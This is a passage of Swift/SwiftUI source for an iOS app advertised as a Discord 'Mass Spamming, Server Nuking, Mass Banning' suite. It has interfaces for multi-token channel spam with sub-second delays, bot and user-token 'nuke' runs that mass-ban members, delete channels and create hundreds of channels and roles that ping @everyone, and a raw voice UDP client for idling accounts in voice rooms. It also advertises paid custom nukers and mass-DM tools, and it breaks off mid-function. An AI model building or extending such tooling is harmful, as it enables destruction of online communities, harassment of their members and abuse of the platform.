                            Image(systemName: "info.circle.fill").foregroundStyle(.blue)
                            Text("About This App").font(.headline)
                        }
                        Text("Quoc Thang Tools is a comprehensive utility suite designed for Discord power users. It provides advanced features such as Mass Spamming, Server Nuking, Mass Banning, and Voice Room integration. Our tools are optimized for both iOS and Android platforms, ensuring smooth and efficient performance.")
                            .font(.subheadline).foregroundStyle(.secondary)
                    }
                    .padding().frame(maxWidth: .infinity, alignment: .leading)
                    .background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)

                    VStack(alignment: .leading, spacing: 12) {
                        HStack {
                            Image(systemName: "crown.fill").foregroundStyle(.yellow)
                            Text("Admin Services").font(.headline)
                        }
                        Text("The administrator specializes in developing and providing custom tools for both Discord PC and Mobile. Whether you need account registration tools, server nukers, mass DM tools, or any other automation, we can build it for you.")
                            .font(.subheadline).foregroundStyle(.secondary)
                        Divider()
                        HStack {
                            Image(systemName: "message.fill").foregroundStyle(.indigo)
                            Text("Contact Admin (Discord):").font(.subheadline.bold())
                            Spacer()
                            Text("@thaitu.thanhhoa")
                                .font(.system(.subheadline, design: .monospaced))
                                .foregroundStyle(.indigo).textSelection(.enabled)
                        }
                        .padding().background(Color.indigo.opacity(0.1)).cornerRadius(10)
                    }
                    .padding().frame(maxWidth: .infinity, alignment: .leading)
                    .background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)

                    Text("Version 1.0.0").font(.caption).foregroundStyle(.tertiary).padding(.top)
                }.padding()
            }
            .background(Color(UIColor.systemGroupedBackground))
            .navigationTitle("Information").navigationBarTitleDisplayMode(.inline)
        }
    }

    private var maskedKey: String {
        guard let key = license.licenseKey else { return "No Key" }
        if showFullKey { return key }
        let parts = key.split(separator: "-")
        if parts.count == 3 { return "\(parts[0])-***-\(parts[2])" }
        return "\(key.prefix(4))***\(key.suffix(4))"
    }
}

// ==========================================
// MARK: - APP ENTRY
// ==========================================
@main
struct SpamDiscordApp: App {
    @StateObject private var app = AppState()
    @StateObject private var bot = BotManager()
    @StateObject private var userNuke = UserNukeManager()
    @StateObject private var license = LicenseManager.shared
    @StateObject private var voiceRoom = VoiceRoomManager.shared
    @StateObject private var musicStream = MusicStreamManager.shared
    @Environment(\.scenePhase) private var scenePhase

    var body: some Scene {
        WindowGroup {
            Group {
                switch license.status {
                case .valid:
                    if AppEndpoints.isLoaded && SecurityGuard.shared.verifyExecutionPermit() {
                        MainTabView()
                            .environmentObject(app)
                            .environmentObject(bot)
                            .environmentObject(userNuke)
                            .environmentObject(license)
                            .environmentObject(voiceRoom)
                            .environmentObject(musicStream)
                    } else {
                        LoadingView()
                    }
                case .checking:
                    LoadingView()
                case .cracked(let reason):
                    CrackedView(message: reason).environmentObject(license)
                case .notActivated, .expired, .invalid:
                    LockView().environmentObject(license)
                }
            }
            .onChange(of: scenePhase) { phase in
                if phase == .active {
                    Task { @MainActor in await license.refreshStatus() }
                    if app.isSending, AppEndpoints.isLoaded {
                        BackgroundManager.shared.start()
                        NowPlayingHelper.shared.update(
                            title: "Quoc Thang Spam",
                            detail: "\(app.totalSent) tin | \(app.selectedTokenIds.count) token")
                    } else if voiceRoom.isRunning {
                        BackgroundManager.shared.start()
                    } else if musicStream.isPlaying {
                        BackgroundManager.shared.start()
                    }
                }
            }
            .onChange(of: license.isUnlocked) { unlocked in
                if !unlocked {
                    app.stopSending()
                    bot.stopNuke()
                    userNuke.stop()
                    voiceRoom.stopTreo()
                    musicStream.stop()
                    BackgroundManager.shared.stop()
                    NowPlayingHelper.shared.stop()
                }
            }
        }
    }
}

struct MainTabView: View {
    var body: some View {
        TabView {
            SpamView().tabItem { Label("Spam", systemImage: "paperplane.fill") }
            TokenListView().tabItem { Label("Tokens", systemImage: "person.2.fill") }
            VoiceRoomTabView().tabItem { Label("Treo Voice", systemImage: "waveform.circle.fill") }
            NukeTabView().tabItem { Label("Nuke", systemImage: "flame.fill") }
            AboutView().tabItem { Label("Info", systemImage: "info.circle.fill") }
        }.tint(.indigo)
    }
}

struct NukeTabView: View {
    @State private var mode: Mode = .bot
    enum Mode { case bot, user }
    var body: some View {
        VStack(spacing: 0) {
            Picker("", selection: $mode) {
                Text("Bot").tag(Mode.bot)
                Text("User Token").tag(Mode.user)
            }.pickerStyle(.segmented).padding(.horizontal).padding(.vertical, 6)
            if mode == .bot { BotNukeView() } else { UserNukeView() }
        }
    }
}

// ==========================================
// MARK: - EMPTY STATE
// ==========================================
struct EmptyStateView: View {
    let title, systemImage, description: String
    var body: some View {
        VStack(spacing: 15) {
            Image(systemName: systemImage).font(.system(size: 50)).foregroundStyle(.secondary)
            Text(title).font(.title2).bold()
            Text(description).font(.subheadline).foregroundStyle(.secondary)
                .multilineTextAlignment(.center).padding(.horizontal)
        }.frame(maxWidth: .infinity, maxHeight: .infinity)
        .background(Color(UIColor.systemGroupedBackground))
    }
}

// ==========================================
// MARK: - TOKEN VIEWS
// ==========================================
struct TokenListView: View {
    @EnvironmentObject var app: AppState
    @State private var showAdd = false
    @State private var showImport = false

    var body: some View {
        NavigationStack {
            Group {
                if app.tokens.isEmpty {
                    EmptyStateView(title: "Chưa có Token", systemImage: "key.slash",
                                   description: "Thêm token để bắt đầu.")
                } else {
                    List {
                        Section("Danh sách (\(app.selectedTokenIds.count) đã chọn)") {
                            ForEach(app.tokens) { t in
                                HStack(spacing: 12) {
                                    if let url = t.avatarURL {
                                        AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                        placeholder: { Circle().fill(Color.gray.opacity(0.3)) }
                                            .frame(width: 45, height: 45).clipShape(Circle())
                                    } else {
                                        Image(systemName: "person.circle.fill").resizable()
                                            .frame(width: 45, height: 45).foregroundStyle(.gray)
                                    }
                                    VStack(alignment: .leading, spacing: 4) {
                                        Text(t.username).font(.headline)
                                        Text(t.isValid ? "Live" : "Die").font(.caption).bold()
                                            .foregroundStyle(t.isValid ? .green : .red)
                                    }
                                    Spacer()
                                    if t.isValid {
                                        Button { app.toggleTokenSelection(t) } label: {
                                            Image(systemName: app.selectedTokenIds.contains(t.id)
                                                  ? "checkmark.circle.fill" : "circle")
                                                .foregroundStyle(.indigo).font(.title3)
                                        }
                                        .buttonStyle(.plain)
                                    }
                                }
                                .padding(.vertical, 4)
                            }
                            .onDelete(perform: app.deleteToken)
                        }
                    }
                }
            }
            .navigationTitle("Quản lý Token")
            .toolbar {
                ToolbarItem(placement: .topBarTrailing) {
                    Menu {
                        Button("Thêm tay", systemImage: "keyboard") { showAdd = true }
                        Button("Nhập file", systemImage: "doc.text") { showImport = true }
                    } label: { Image(systemName: "plus.circle.fill").font(.title3) }
                }
            }
            .sheet(isPresented: $showAdd) { AddTokenSheet() }
            .sheet(isPresented: $showImport) {
                DocumentPicker(contentTypes: [.item]) { u in Task { await app.addTokensFromFile(url: u) } }
            }
            .overlay {
                if app.isCheckingToken {
                    ProgressView("Đang check...").padding()
                        .background(.ultraThinMaterial, in: RoundedRectangle(cornerRadius: 12))
                }
            }
        }
    }
}

struct AddTokenSheet: View {
    @EnvironmentObject var app: AppState
    @Environment(\.dismiss) var dismiss
    @State private var input = ""
    var body: some View {
        NavigationStack {
            Form {
                Section("Nhập Token") {
                    TextField("Dán token...", text: $input)
                        .autocorrectionDisabled().textInputAutocapitalization(.never)
                }
            }
            .navigationTitle("Thêm Token").navigationBarTitleDisplayMode(.inline)
            .toolbar {
                ToolbarItem(placement: .cancellationAction) { Button("Huỷ") { dismiss() } }
                ToolbarItem(placement: .confirmationAction) {
                    Button("Lưu") { Task { await app.addToken(input); dismiss() } }
                        .disabled(input.isEmpty || app.isCheckingToken)
                }
            }
        }
    }
}

// ==========================================
// MARK: - SPAM VIEWS
// ==========================================
struct SpamView: View {
    @EnvironmentObject var app: AppState
    @State private var searchText = ""

    var displayedGuilds: [Guild] { app.multiGuilds }
    var filtered: [Guild] {
        searchText.isEmpty
            ? displayedGuilds
            : displayedGuilds.filter { $0.name.localizedCaseInsensitiveContains(searchText) }
    }

    var body: some View {
        NavigationStack {
            VStack(spacing: 0) {
                if app.selectedTokenIds.count >= 2 {
                    HStack(spacing: 6) {
                        Image(systemName: "person.2.fill")
                        Text("\(app.selectedTokenIds.count) token · Server chung: \(app.multiGuilds.count)")
                            .font(.caption.bold())
                    }
                    .foregroundStyle(.indigo)
                    .padding(8).frame(maxWidth: .infinity)
                    .background(Color.indigo.opacity(0.1)).cornerRadius(8)
                    .padding(.horizontal, 12).padding(.top, 4)
                }

                Group {
                    if app.selectedTokenIds.isEmpty {
                        EmptyStateView(title: "Chưa chọn Token", systemImage: "exclamationmark.triangle",
                                       description: "Vào tab Tokens để chọn 1 hoặc nhiều token.")
                    } else if app.isLoading {
                        ProgressView("Đang tải...")
                    } else if filtered.isEmpty {
                        EmptyStateView(title: "Không có server chung", systemImage: "server.rack",
                                       description: "Các token được chọn không cùng ở server nào.")
                    } else {
                        List(filtered) { g in
                            NavigationLink(value: g) {
                                HStack {
                                    if let icon = g.icon, !AppEndpoints.cdnIcons.isEmpty,
                                       let url = URL(string: "\(AppEndpoints.cdnIcons)/\(g.id)/\(icon).png?size=64") {
                                        AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                        placeholder: { Circle().fill(.gray) }.frame(width: 35, height: 35).clipShape(Circle())
                                    } else { Circle().fill(.gray.opacity(0.3)).frame(width: 35, height: 35) }
                                    Text(g.name).fontWeight(.medium)
                                }
                            }
                        }.searchable(text: $searchText, prompt: "Tìm Server...")
                    }
                }
            }
            .navigationTitle("Chọn Server")
            .navigationDestination(for: Guild.self) { ChannelListView(guild: $0) }
            .refreshable { await app.recomputeMultiGuilds() }
        }
    }
}

struct ChannelListView: View {
    @EnvironmentObject var app: AppState
    let guild: Guild
    @State private var searchText = ""
    var sections: [(category: Channel?, items: [Channel])] {
        let s = app.groupedChannels()
        if searchText.isEmpty { return s }
        return s.compactMap { sec in
            let f = sec.items.filter { $0.displayName.localizedCaseInsensitiveContains(searchText) }
            return f.isEmpty ? nil : (sec.category, f)
        }
    }
    var body: some View {
        Group {
            if app.isLoading { ProgressView() }
            else {
                List {
                    ForEach(sections, id: \.category?.id) { sec in
                        Section {
                            ForEach(sec.items) { c in
                                NavigationLink(value: c) {
                                    HStack {
                                        Image(systemName: c.type == 5 ? "megaphone" : "number")
                                            .foregroundStyle(.secondary)
                                        Text(c.displayName)
                                    }
                                }
                            }
                        } header: {
                            Text(sec.category?.displayName.uppercased() ?? "KHÁC")
                                .font(.caption).bold()
                        }
                    }
                }
            }
        }
        .searchable(text: $searchText, prompt: "Tìm kênh...")
        .navigationTitle(guild.name)
        .task { await app.loadChannels(for: guild) }
        .navigationDestination(for: Channel.self) { SendView(channel: $0) }
    }
}

struct SendView: View {
    @EnvironmentObject var app: AppState
    let channel: Channel
    @State private var showImport = false
    @State private var showErr = false

    var body: some View {
        ScrollView {
            VStack(spacing: 16) {
                HStack {
                    Image(systemName: "number.circle.fill").font(.title).foregroundStyle(.indigo)
                    Text(channel.displayName).font(.title2.bold())
                    Spacer()
                }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)

                VStack(alignment: .leading, spacing: 12) {
                    Text("CẤU HÌNH").font(.caption).bold().foregroundStyle(.secondary)
                    Toggle("Tag User ID", isOn: $app.useTag).tint(.indigo)
                    if app.useTag {
                        TextField("User ID", text: $app.targetUserId).keyboardType(.numberPad)
                            .padding(10).background(Color(UIColor.tertiarySystemBackground)).cornerRadius(8)
                    }
                    HStack {
                        Toggle("Thêm '>'", isOn: $app.addPrefix).tint(.indigo)
                        Toggle("Thêm '#'", isOn: $app.addSuffix).tint(.indigo)
                    }
                    VStack(alignment: .leading, spacing: 8) {
                        HStack {
                            Text("Delay:")
                            Spacer()
                            Text("\(String(format: "%.1f", app.delaySeconds))s").bold()
                                .foregroundStyle(app.delaySeconds < 1.0 ? .red : .indigo)
                        }
                        Slider(value: $app.delaySeconds, in: 0.1...5.0, step: 0.1).tint(.indigo)
                    }
                }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)

                VStack(alignment: .leading, spacing: 10) {
                    HStack {
                        Text("NỘI DUNG TIN NHẮN").font(.caption).bold().foregroundStyle(.secondary)
                        Spacer()
                        Button { showImport = true } label: {
                            Label("Import", systemImage: "doc.badge.plus").font(.caption).bold()
                        }
                    }
                    ZStack(alignment: .topTrailing) {
                        TextEditor(text: $app.inputText)
                            .frame(height: 100).padding(8)
                            .background(Color(UIColor.tertiarySystemBackground)).cornerRadius(10)
                            .onChange(of: app.inputText) { _ in app.parseDirectInput() }
                        if !app.inputText.isEmpty {
                            Button { app.inputText = ""; app.parseDirectInput() } label: {
                                Image(systemName: "xmark.circle.fill").foregroundStyle(.gray).padding(12)
                            }
                        }
                    }
                    if !app.messages.isEmpty {
                        Text("Nhận diện: \(app.messages.count) dòng").font(.caption).foregroundStyle(.green)
                    }
                }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)

                if app.isSending {
                    VStack(spacing: 12) {
                        HStack {
                            ProgressView().tint(.indigo)
                            Text("Đang gửi...").font(.headline).foregroundStyle(.indigo)
                            Spacer()
                            Text("\(app.totalSent) tin").font(.headline).bold()
                        }
                        if !app.currentMessageStr.isEmpty {
                            Text(app.currentMessageStr)
                                .font(.caption).foregroundStyle(.secondary)
                                .lineLimit(2).truncationMode(.tail)
                        }
                        if !app.tokenSendCount.isEmpty {
                            ForEach(Array(app.tokenSendCount.keys), id: \.self) { id in
                                if let t = app.tokens.first(where: { $0.id == id }) {
                                    HStack {
                                        Text(t.username).font(.caption)
                                        Spacer()
                                        Text("\(app.tokenSendCount[id] ?? 0)").font(.caption.bold())
                                    }
                                }
                            }
                        }
                        Button(role: .destructive) {
                            app.stopSending()
                        } label: {
                            Label("Dừng", systemImage: "stop.fill").frame(maxWidth: .infinity).padding()
                        }
                        .background(Color.red).foregroundStyle(.white).cornerRadius(10)
                    }
                    .padding()
                    .background(Color(UIColor.secondarySystemBackground))
                    .cornerRadius(15)
                } else {
                    Button {
                        app.hideKeyboard()
                        app.startSending(channel: channel)
                    } label: {
                        HStack {
                            Image(systemName: "paperplane.fill")
                            Text("BẮT ĐẦU SPAM").bold()
                        }
                        .frame(maxWidth: .infinity).padding()
                    }
                    .background(app.messages.isEmpty || (app.useTag && app.targetUserId.isEmpty) ? Color.gray : Color.indigo)
                    .foregroundStyle(.white).cornerRadius(10)
                    .disabled(app.messages.isEmpty || (app.useTag && app.targetUserId.isEmpty))
                }

                if let err = app.lastError {
                    Text(err).font(.caption).foregroundStyle(.red)
                }

                Spacer(minLength: 20)
            }
            .padding()
        }
        .background(Color(UIColor.systemGroupedBackground))
        .navigationTitle("Gửi tin")
        .navigationBarTitleDisplayMode(.inline)
        .sheet(isPresented: $showImport) {
            DocumentPicker(contentTypes: [.plainText, .text, .item]) { u in app.parseFile(url: u) }
        }
    }
}

// ==========================================
// MARK: - BOT NUKE VIEW
// ==========================================
struct BotNukeView: View {
    @EnvironmentObject var bot: BotManager
    @State private var showTokenSheet = false
    @State private var tokenInput = ""
    @State private var selectedGuild: Guild?
    @State private var showConfigSheet = false
    @State private var nukeConfig = NukeConfig()

    var body: some View {
        Group {
            if bot.config == nil {
                EmptyStateView(title: "Chưa cấu hình Bot",
                               systemImage: "key.slash",
                               description: "Nhập bot token để bắt đầu nuke server.")
                    .overlay(alignment: .bottom) {
                        Button {
                            showTokenSheet = true
                        } label: {
                            Label("Nhập Bot Token", systemImage: "key.fill")
                                .frame(maxWidth: .infinity).padding()
                        }
                        .background(Color.indigo).foregroundStyle(.white).cornerRadius(10)
                        .padding()
                    }
            } else if bot.isNuking {
                ScrollView {
                    VStack(spacing: 14) {
                        HStack {
                            ProgressView().tint(.red)
                            Text(bot.currentPhase).font(.headline)
                            Spacer()
                        }
                        ProgressView(value: bot.phaseProgress).tint(.red)
                        HStack(spacing: 12) {
                            StatCard(title: "Ban OK", value: "\(bot.banSuccess)", color: .green)
                            StatCard(title: "Ban FAIL", value: "\(bot.banFailed)", color: .red)
                        }
                        HStack(spacing: 12) {
                            StatCard(title: "Xóa kênh", value: "\(bot.channelsDeleted)", color: .orange)
                            StatCard(title: "Tạo kênh", value: "\(bot.channelsCreated)", color: .blue)
                        }
                        HStack(spacing: 12) {
                            StatCard(title: "Tin nhắn", value: "\(bot.messagesSent)", color: .purple)
                            StatCard(title: "Role", value: "\(bot.rolesCreated)", color: .pink)
                        }
                        ScrollView {
                            VStack(alignment: .leading, spacing: 4) {
                                ForEach(bot.nukeLog.suffix(200), id: \.self) { line in
                                    Text(line).font(.system(size: 10, design: .monospaced))
                                        .foregroundStyle(.secondary)
                                }
                            }.frame(maxWidth: .infinity, alignment: .leading)
                        }
                        .frame(height: 200).padding(8)
                        .background(Color(UIColor.tertiarySystemBackground)).cornerRadius(10)

                        Button(role: .destructive) {
                            bot.stopNuke()
                        } label: {
                            Label("DỪNG", systemImage: "stop.fill").frame(maxWidth: .infinity).padding()
                        }
                        .background(Color.red).foregroundStyle(.white).cornerRadius(10)
                    }.padding()
                }
            } else {
                List {
                    Section("Bot") {
                        HStack {
                            if let url = bot.config?.avatarURL {
                                AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                placeholder: { Circle().fill(.gray) }.frame(width: 40, height: 40).clipShape(Circle())
                            }
                            VStack(alignment: .leading) {
                                Text(bot.config?.displayName ?? "").font(.headline)
                                Text("Bot").font(.caption).foregroundStyle(.secondary)
                            }
                            Spacer()
                            Button(role: .destructive) { bot.removeConfig() } label: {
                                Image(systemName: "trash")
                            }
                        }
                    }
                    Section("Chọn server để nuke") {
                        if bot.botGuilds.isEmpty {
                            Text("Không có server").foregroundStyle(.secondary)
                        } else {
                            ForEach(bot.botGuilds) { g in
                                Button {
                                    selectedGuild = g
                                    showConfigSheet = true
                                } label: {
                                    HStack {
                                        if let icon = g.icon, !AppEndpoints.cdnIcons.isEmpty,
                                           let url = URL(string: "\(AppEndpoints.cdnIcons)/\(g.id)/\(icon).png?size=64") {
                                            AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                            placeholder: { Circle().fill(.gray) }.frame(width: 32, height: 32).clipShape(Circle())
                                        } else { Circle().fill(.gray.opacity(0.3)).frame(width: 32, height: 32) }
                                        Text(g.name).foregroundStyle(.primary)
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        .sheet(isPresented: $showTokenSheet) {
            NavigationStack {
                Form {
                    Section("Bot Token") {
                        TextField("Dán bot token...", text: $tokenInput)
                            .autocorrectionDisabled().textInputAutocapitalization(.never)
                    }
                    if let e = bot.tokenError {
                        Text(e).font(.caption).foregroundStyle(.red)
                    }
                }
                .navigationTitle("Bot Token").navigationBarTitleDisplayMode(.inline)
                .toolbar {
                    ToolbarItem(placement: .cancellationAction) { Button("Huỷ") { showTokenSheet = false } }
                    ToolbarItem(placement: .confirmationAction) {
                        Button("Lưu") {
                            Task {
                                await bot.setToken(tokenInput)
                                if bot.config != nil { showTokenSheet = false }
                            }
                        }.disabled(tokenInput.isEmpty || bot.isCheckingToken)
                    }
                }
            }
        }
        .sheet(isPresented: $showConfigSheet) {
            if let g = selectedGuild {
                NukeConfigSheet(guild: g, config: $nukeConfig, title: "Bot Nuke") {
                    Task {
                        showConfigSheet = false
                        await bot.runNuke(guild: g, options: nukeConfig)
                    }
                }
            }
        }
    }
}

// ==========================================
// MARK: - USER NUKE VIEW
// ==========================================
struct UserNukeView: View {
    @EnvironmentObject var userNuke: UserNukeManager
    @State private var showImport = false
    @State private var selectedGuild: Guild?
    @State private var showConfigSheet = false
    @State private var nukeConfig = NukeConfig()

    var body: some View {
        Group {
            if userNuke.isNuking {
                ScrollView {
                    VStack(spacing: 14) {
                        HStack {
                            ProgressView().tint(.red)
                            Text(userNuke.currentPhase).font(.headline)
                            Spacer()
                        }
                        ProgressView(value: userNuke.phaseProgress).tint(.red)
                        HStack(spacing: 12) {
                            StatCard(title: "Ban OK", value: "\(userNuke.banSuccess)", color: .green)
                            StatCard(title: "Ban FAIL", value: "\(userNuke.banFailed)", color: .red)
                        }
                        HStack(spacing: 12) {
                            StatCard(title: "Xóa kênh", value: "\(userNuke.channelsDeleted)", color: .orange)
                            StatCard(title: "Tạo kênh", value: "\(userNuke.channelsCreated)", color: .blue)
                        }
                        HStack(spacing: 12) {
                            StatCard(title: "Tin nhắn", value: "\(userNuke.messagesSent)", color: .purple)
                            StatCard(title: "Role", value: "\(userNuke.rolesCreated)", color: .pink)
                        }
                        ScrollView {
                            VStack(alignment: .leading, spacing: 4) {
                                ForEach(userNuke.nukeLog.suffix(200), id: \.self) { line in
                                    Text(line).font(.system(size: 10, design: .monospaced))
                                        .foregroundStyle(.secondary)
                                }
                            }.frame(maxWidth: .infinity, alignment: .leading)
                        }
                        .frame(height: 200).padding(8)
                        .background(Color(UIColor.tertiarySystemBackground)).cornerRadius(10)

                        Button(role: .destructive) {
                            userNuke.stop()
                        } label: {
                            Label("DỪNG", systemImage: "stop.fill").frame(maxWidth: .infinity).padding()
                        }
                        .background(Color.red).foregroundStyle(.white).cornerRadius(10)
                    }.padding()
                }
            } else {
                List {
                    Section("Tokens (\(userNuke.selectedTokenIds.count)/\(userNuke.tokens.count))") {
                        if userNuke.tokens.isEmpty {
                            Text("Chưa có token").foregroundStyle(.secondary)
                        } else {
                            ForEach(userNuke.tokens) { t in
                                HStack {
                                    if let url = t.avatarURL {
                                        AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                        placeholder: { Circle().fill(.gray) }.frame(width: 35, height: 35).clipShape(Circle())
                                    }
                                    VStack(alignment: .leading) {
                                        Text(t.username).font(.subheadline)
                                        Text(t.isValid ? "Live" : "Die")
                                            .font(.caption2)
                                            .foregroundStyle(t.isValid ? .green : .red)
                                    }
                                    Spacer()
                                    if t.isValid {
                                        Button { userNuke.toggleSelection(t) } label: {
                                            Image(systemName: userNuke.selectedTokenIds.contains(t.id)
                                                  ? "checkmark.circle.fill" : "circle")
                                                .foregroundStyle(.indigo)
                                        }.buttonStyle(.plain)
                                    }
                                    Button(role: .destructive) {
                                        userNuke.removeToken(t.id)
                                    } label: {
                                        Image(systemName: "trash").font(.caption)
                                    }
                                }
                            }
                        }
                        Button {
                            showImport = true
                        } label: {
                            Label("Import file token", systemImage: "doc.badge.plus")
                        }
                    }

                    Section("Server có thể nuke") {
                        if userNuke.selectedTokenIds.isEmpty {
                            Text("Chọn token trước").foregroundStyle(.secondary)
                        } else if userNuke.isLoadingGuilds {
                            ProgressView()
                        } else if userNuke.eligibleGuilds.isEmpty {
                            Text("Không có server phù hợp").foregroundStyle(.secondary)
                        } else {
                            ForEach(userNuke.eligibleGuilds) { g in
                                Button {
                                    selectedGuild = g
                                    showConfigSheet = true
                                } label: {
                                    HStack {
                                        if let icon = g.icon, !AppEndpoints.cdnIcons.isEmpty,
                                           let url = URL(string: "\(AppEndpoints.cdnIcons)/\(g.id)/\(icon).png?size=64") {
                                            AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                            placeholder: { Circle().fill(.gray) }.frame(width: 32, height: 32).clipShape(Circle())
                                        } else { Circle().fill(.gray.opacity(0.3)).frame(width: 32, height: 32) }
                                        Text(g.name).foregroundStyle(.primary)
                                    }
                                }
                            }
                        }
                    }
                }
                .refreshable { await userNuke.loadAllGuildsForSelected() }
            }
        }
        .onChange(of: userNuke.selectedTokenIds) { _ in
            Task { await userNuke.loadAllGuildsForSelected() }
        }
        .sheet(isPresented: $showImport) {
            DocumentPicker(contentTypes: [.plainText, .text, .item]) { u in
                Task { await userNuke.importFromFile(url: u) }
            }
        }
        .sheet(isPresented: $showConfigSheet) {
            if let g = selectedGuild {
                NukeConfigSheet(guild: g, config: $nukeConfig, title: "User Nuke") {
                    Task {
                        showConfigSheet = false
                        await userNuke.runNuke(guild: g, options: nukeConfig)
                    }
                }
            }
        }
    }
}

// ==========================================
// MARK: - NUKE CONFIG SHEET
// ==========================================
struct NukeConfigSheet: View {
    let guild: Guild
    @Binding var config: NukeConfig
    let title: String
    let onRun: () -> Void
    @Environment(\.dismiss) var dismiss

    var body: some View {
        NavigationStack {
            Form {
                Section("Bước thực hiện") {
                    ForEach(NukeStepType.allCases) { step in
                        Toggle(isOn: Binding(
                            get: { config.enabledSteps.contains(step) },
                            set: { on in
                                if on { config.enabledSteps.insert(step) }
                                else { config.enabledSteps.remove(step) }
                            })) {
                            Label(step.rawValue, systemImage: step.icon)
                        }
                    }
                }

                Section("Tuỳ chọn") {
                    if config.enabledSteps.contains(.massBan) {
                        TextField("Ban role ID (tuỳ chọn)", text: $config.banRoleId)
                            .keyboardType(.numberPad)
                        HStack {
                            Text("Delay ban")
                            Slider(value: $config.banDelay, in: 0...1.0, step: 0.01)
                            Text("\(String(format: "%.2f", config.banDelay))s").font(.caption)
                        }
                    }
                    if config.enabledSteps.contains(.renameGuild) {
                        TextField("Tên server mới", text: $config.newGuildName)
                    }
                    if config.enabledSteps.contains(.createRoles) {
                        TextField("Tên role", text: $config.roleName)
                        Stepper("Số role: \(config.roleCount)", value: $config.roleCount, in: 1...500)
                    }
                    if config.enabledSteps.contains(.createChannels) {
                        TextField("Tên kênh", text: $config.channelName)
                        Stepper("Số kênh: \(config.channelCount)", value: $config.channelCount, in: 1...500)
                        TextField("Nội dung tin nhắn", text: $config.messageContent, axis: .vertical)
                            .lineLimit(3...6)
                        Toggle("Tag @everyone", isOn: $config.tagEveryone)
                    }
                }
            }
            .navigationTitle("\(title): \(guild.name)")
            .navigationBarTitleDisplayMode(.inline)
            .toolbar {
                ToolbarItem(placement: .cancellationAction) { Button("Huỷ") { dismiss() } }
                ToolbarItem(placement: .confirmationAction) {
                    Button("BẮT ĐẦU") {
                        if config.enabledSteps.isEmpty { dismiss(); return }
                        onRun()
                    }
                    .bold()
                    .disabled(config.enabledSteps.isEmpty)
                }
            }
        }
    }
}

// ==========================================
// MARK: - STAT CARD
// ==========================================
struct StatCard: View {
    let title: String
    let value: String
    let color: Color
    var body: some View {
        VStack(spacing: 4) {
            Text(value).font(.title3.bold()).foregroundStyle(color)
            Text(title).font(.caption2).foregroundStyle(.secondary)
        }
        .frame(maxWidth: .infinity).padding(8)
        .background(color.opacity(0.1)).cornerRadius(8)
    }
}

// ==============================================================================
// MARK: - DISCORD VOICE GATEWAY & XẢ MIC VIP & TREO ROOM 24/7 (MAKE SUPER VIP)
// ==============================================================================

// MARK: - HELPER: DNS HOST RESOLUTION & GUILD ID FETCH
func resolveHostToIPv4(_ host: String) -> String? {
    var hints = addrinfo()
    hints.ai_family = AF_INET
    hints.ai_socktype = SOCK_DGRAM
    hints.ai_protocol = IPPROTO_UDP

    var res: UnsafeMutablePointer<addrinfo>?
    if getaddrinfo(host, nil, &hints, &res) == 0, let first = res {
        defer { freeaddrinfo(res) }
        let sockaddrIn = first.pointee.ai_addr.withMemoryRebound(to: sockaddr_in.self, capacity: 1) { $0.pointee }
        var addrCopy = sockaddrIn.sin_addr
        var ipBuf = [CChar](repeating: 0, count: Int(INET_ADDRSTRLEN))
        if inet_ntop(AF_INET, &addrCopy, &ipBuf, socklen_t(INET_ADDRSTRLEN)) != nil {
            return String(cString: ipBuf)
        }
    }
    return nil
}

func fetchGuildIdForChannel(token: String, channelId: String) async -> String? {
    guard let url = URL(string: "https://discord.com/api/v9/channels/\(channelId)") else { return nil }
    var req = URLRequest(url: url)
    req.addValue(token, forHTTPHeaderField: "Authorization")
    req.addValue("application/json", forHTTPHeaderField: "Content-Type")
    do {
        let (data, resp) = try await URLSession.shared.data(for: req)
        if let http = resp as? HTTPURLResponse, http.statusCode == 200 {
            if let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any] {
                return json["guild_id"] as? String
            }
        }
    } catch {
        return nil
    }
    return nil
}

/// Trích xuất hostname sạch từ Voice Endpoint (loại bỏ wss:// và mọi :port phía sau)
func cleanVoiceEndpoint(_ endpoint: String) -> String {
    var ep = endpoint
    if ep.hasPrefix("wss://") { ep = String(ep.dropFirst(6)) }
    if ep.hasPrefix("ws://") { ep = String(ep.dropFirst(5)) }
    if let slash = ep.firstIndex(of: "/") { ep = String(ep[..<slash]) }
    if let colon = ep.firstIndex(of: ":") { ep = String(ep[..<colon]) }
    return ep.trimmingCharacters(in: .whitespacesAndNewlines)
}

// MARK: - DISCORD VOICE UDP CLIENT & PROTOCOL HANDSHAKE
final class DiscordVoiceUDPClient {
    private var sockfd: Int32 = -1
    private var serverAddr: sockaddr_in?
    private(set) var isConnected = false

    func connect(ip: String, port: UInt16) -> Bool {
        close()
        sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
        guard sockfd >= 0 else { return false }

        var tv = timeval(tv_sec: 2, tv_usec: 0)
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, socklen_t(MemoryLayout<timeval>.size))

        var addr = sockaddr_in()
        addr.sin_family = sa_family_t(AF_INET)
        addr.sin_port = port.bigEndian

        // Dùng inet_pton hoặc DNS resolve nếu server trả về domain name
        if inet_pton(AF_INET, ip, &addr.sin_addr) <= 0 {
            if let resolved = resolveHostToIPv4(ip) {
                inet_pton(AF_INET, resolved, &addr.sin_addr)
            } else {
                close()
                return false
            }
        }

        self.serverAddr = addr
        self.isConnected = true
        return true
    }

    /// IP Discovery (Discord Voice UDP Protocol RFC - Hỗ trợ retry 3 lần)
    func discoverIP(ssrc: UInt32) -> (ip: String, port: UInt16)? {
        guard sockfd >= 0, var addr = serverAddr else { return nil }

        var packet = [UInt8](repeating: 0, count: 74)
        packet[0] = 0x00
        packet[1] = 0x01
        packet[2] = 0x00
        packet[3] = 0x46
        packet[4] = UInt8((ssrc >> 24) & 0xFF)
        packet[5] = UInt8((ssrc >> 16) & 0xFF)
        packet[6] = UInt8((ssrc >> 8) & 0xFF)
